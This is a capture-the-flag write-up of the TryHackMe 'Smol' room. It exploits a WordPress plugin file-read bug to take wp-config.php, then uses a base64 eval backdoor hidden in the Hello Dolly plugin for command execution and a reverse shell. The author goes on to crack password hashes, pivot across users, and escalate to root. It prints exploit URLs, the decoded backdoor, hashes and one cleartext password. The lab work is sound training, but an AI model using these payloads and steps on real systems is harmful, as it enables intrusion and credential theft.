# Smol TryHackMe Writeup

- Link: https://tryhackme.com/room/smol
- IP Address: 10.10.216.114
- Date: June 25, 2025

-> Starting off with a nmap scan as usual

```┌──(kali㉿kali)-[~/Downloads/THM/smol_THM]
└─$ nmap -sC -sV 10.10.216.114           
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-25 15:12 +04
Nmap scan report for smol.thm (10.10.216.114)
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://www.smol.thm/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.11 seconds
```

-> We have a http server on port 80
-> Starting off with directory enumeration using gobuster:

```┌──(kali㉿kali)-[~/Downloads/THM/smol_THM]
└─$ gobuster dir -u http://www.smol.thm/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://www.smol.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.php            (Status: 301) [Size: 0] [--> http://www.smol.thm/]
/server-status        (Status: 403) [Size: 277]
/wp-admin             (Status: 301) [Size: 315] [--> http://www.smol.thm/wp-admin/]
/wp-content           (Status: 301) [Size: 317] [--> http://www.smol.thm/wp-content/]
/wp-includes          (Status: 301) [Size: 318] [--> http://www.smol.thm/wp-includes/]
/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

-> Looks like the webserver is running wordpress. Let's run a 'wpscan'.

```
[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
```

-> After looking into the results, this plugin seems to have a SSRF vulnerability; CVE-2018-20463

![](attachments/Pasted%20image%2020250625152447.png)

-> Following the PoC:

```
http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

-> We found a database username and password:

![](attachments/Pasted%20image%2020250625152733.png)

-> Logging into /wp-login using these credentials, we get access to /wp-admin

![](attachments/Pasted%20image%2020250625152932.png)

-> Looking through the pages, I found an interesting page named 'Webmaster Tasks!!'

![](attachments/Pasted%20image%2020250625153246.png)

-> This page clearly mentions a plugin named 'Hello Dolly' and to verify the source code of the same. We could possibly have some interesting information in there. 
-> We can probably use the same vulnerability used to access wp-config.php to get the source code for the plugin. After some research, I found the name of the target file is 'hello.php'.

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../hello.php
```

-> This command didn't seem to work. This was when I realized my mistake and looked into where wordpress plugins are stored.

```
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
```

-> At this point, it was still not working. This was when I realized my machine on tryhackme had crashed (no surprise really). So I started a new machine and got to work with the new IP address.

- IP Address: 10.10.133.67

-> This time, it worked! The php file contained a function for lyrics to Hello Dolly but what was interesting was the base64 string paired with an eval function. Eval functions are always nice to see :) 

![](attachments/Pasted%20image%2020250625155324.png)

-> Decoding the base64 string,

```┌──(kali㉿kali)-[/usr/share/exploitdb]
└─$ echo "CiBpZiAoaXNzZXQoJF9HRVRbIlwxNDNcMTU1XHg2NCJdKSkgeyBzeXN0ZW0oJF9HRVRbIlwxNDNceDZkXDE0NCJdKTsgfSA=" | base64 -d

 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); }
```

![](attachments/Pasted%20image%2020250625155628.png)

-> What this means is that we can basically run cmd commands using commands like these:

```
www.smol.thm/wp-admin/index.php?cmd=whoami
```

![](attachments/Pasted%20image%2020250625160042.png)

-> We can now use this to obtain a reverse shell. After trying a bunch of different reverse shell scripts, the one that finally worked for me was uploading a php reverse shell and then running it.

![](attachments/Pasted%20image%2020250625160712.png)

```┌──(kali㉿kali)-[~/Downloads/THM/smol_THM]
└─$ nc -lvnp 4433
listening on [any] 4433 ...
connect to [10.8.35.149] from (UNKNOWN) [10.10.133.67] 47816
Linux smol 5.4.0-156-generic #173-Ubuntu SMP Tue Jul 11 07:25:22 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 12:07:40 up 17 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

-> We're in!
-> Earlier, we had found the username and password for a database in wp-config. Let's use that to see if there's anything interesting in there

```
www-data@smol:/$ mysql -u wpuser -p
mysql -u wpuser -p
Enter password: *redacted*
```

-> Looking through, I found a table named wp_users with usernames and password hashes

```
mysql> select user_login,user_pass from wp_users;
select user_login,user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. |
| wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. |
| think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |
| gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 |
| diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 |
| xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 |
+------------+------------------------------------+
```

-> Adding these hashes to a file and running it through johntheripper, and waiting for as long as a ferrari F1 pitstop (a long time), we got diego's password

```
admin$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
wpuser:$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.
think:$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
gege:$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
```

```┌──(kali㉿kali)-[~/Downloads/THM/smol_THM]
└─$ john passhash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (phpass [phpass ($P$ or $H$) 128/128 ASIMD 4x2])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*redacted* (diego)
```

-> I tried logging into ssh but was unsuccessful. Instead, I just switched user's to diego on the reverse shell

```
www-data@smol:/$ su diego
su diego
Password: sandiegocalifornia

diego@smol:/$ whoami
whoami
diego
```

-> Going through diego's home directory, we were able to find the first flag, user.txt

```
diego@smol:/home$ cd diego
cd diego
diego@smol:~$ ls
ls
user.txt
diego@smol:~$ cat user.txt
cat user.txt
*redacted*
```

-> Now, to privilege escalate, let's first run ```sudo -l```

```
diego@smol:~$ sudo -l
sudo -l
[sudo] password for diego: 

Sorry, user diego may not run sudo on smol.
```

-> Uh oh.
-> Going through other user's home directories, we find a rsa_pub key in think's /.ssh folder. We can use this to get a ssh connection.

```
┌──(kali㉿kali)-[~/Downloads/THM/smol_THM]
└─$ ssh -i id_rsa think@10.10.133.67 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 25 Jun 2025 12:56:44 PM UTC

  System load:  0.32              Processes:             149
  Usage of /:   56.9% of 9.75GB   Users logged in:       0
  Memory usage: 17%               IPv4 address for ens5: 10.10.133.67
  Swap usage:   0%

  => There are 2 zombie processes.


Expanded Security Maintenance for Applications is not enabled.

162 updates can be applied immediately.
125 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

think@smol:~$
```

-> And now, we're in as think. Let's bring out the big guns and transfer over linpeas. 

```
think@smol:/tmp$ wget 10.8.35.149:80/linpeas.sh
--2025-06-25 12:58:47--  http://10.8.35.149/linpeas.sh
Connecting to 10.8.35.149:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840139 (820K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh            100%[=======================>] 820.45K   843KB/s    in 1.0s    

2025-06-25 12:58:48 (843 KB/s) - ‘linpeas.sh’ saved [840139/840139]

think@smol:/tmp$ chmod +x linpeas.sh 
think@smol:/tmp$ ./linpeas.sh
```

![](attachments/Pasted%20image%2020250625170149.png)

-> After about 30 minutes of trying, I concluded that I should look into other areas and come back to this later if I still can't find anything

-> At this point, I still couldn't find much of anything. Until I went back to the home directory and into gege directory. The file 'wordpress.old.zip' looked intriguing so I tried extracting it but was denied permission. That was until I did this:

```
think@smol:/home/gege$ ls -la
total 31532
drwxr-x--- 2 gege internal     4096 Aug 18  2023 .
drwxr-xr-x 6 root root         4096 Aug 16  2023 ..
lrwxrwxrwx 1 root root            9 Aug 18  2023 .bash_history -> /dev/null
-rw-r--r-- 1 gege gege          220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 gege gege         3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 gege gege          807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root            9 Aug 18  2023 .viminfo -> /dev/null
-rwxr-x--- 1 root gege     32266546 Aug 16  2023 wordpress.old.zip
think@smol:/home/gege$ cd wordpress.old.zip
-bash: cd: wordpress.old.zip: Not a directory
think@smol:/home/gege$ su gege
gege@smol:~$ 
```

-> I got lucky. Looking into what actually caused this, I found the cause

```
gege@smol:~$ find / -name su 2>/dev/null
/etc/pam.d/su
/usr/share/bash-completion/completions/su
/usr/bin/su
gege@smol:~$ cat /etc/pam.d/su
#
# The PAM configuration file for the Shadow `su' service
#

# This allows root to su without passwords (normal operation)
auth       sufficient pam_rootok.so
auth  [success=ignore default=1] pam_succeed_if.so user = gege
auth  sufficient                 pam_succeed_if.so use_uid user = think
```

-> Trying to unzip the file, I found that it was password protected. 

```
gege@smol:~$ unzip wordpress.old.zip 
Archive:  wordpress.old.zip
   creating: wordpress.old/
[wordpress.old.zip] wordpress.old/wp-config.php password: 
```

-> Transferring over the file to the attacker machine and using john to get the password

```┌──(kali㉿kali)-[~/Downloads/THM/smol_THM]
└─$ john ziphash --wordlist=/usr/share/wordlists/rockyou.txt          
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
*redacted*@hotmail.com (wordpress.old.zip)
```

-> After unzipping the file and going through its contents, we find the user xavi's password in wp-config.php

![](attachments/Pasted%20image%2020250625171905.png)

-> Switching user's to xavi in ssh, and then running ```sudo -l```

```
xavi@smol:~$ sudo -l
[sudo] password for xavi: 
Matching Defaults entries for xavi on smol:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User xavi may run the following commands on smol:
    (ALL : ALL) ALL

```

-> Turns out xavi is a very privileged user.

```
xavi@smol:~$ sudo su
root@smol:/home/xavi$ cd /root
root@smol:~$ cat root.txt
*redacted*
```

-> With that, we have the final flag for this room, root.txt
